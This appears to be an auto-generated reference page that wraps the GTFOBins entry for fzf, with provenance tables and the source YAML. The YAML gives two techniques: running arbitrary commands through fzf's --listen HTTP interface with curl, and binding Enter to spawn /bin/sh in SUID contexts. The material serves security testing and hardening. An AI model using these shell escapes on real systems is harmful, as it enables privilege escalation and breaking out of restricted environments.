---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# fzf

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `fzf` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/fzf` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [fzf](../../tools/linux/fzf.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | fzf |
| name | fzf |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/fzf/ |

## Preserved Source Material

````yaml
_body: ''
_name: fzf
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/fzf
functions:
  command:
  - code: fzf --listen=12345
    comment: 'Commands can be issued via POST requests, for example:


      ```

      curl http://localhost:12345 -d ''execute(/path/to/command)''

      ```'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  shell:
  - code: fzf --bind 'enter:execute(/bin/sh)'
    comment: Press `Enter` to receive the shell.
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
````
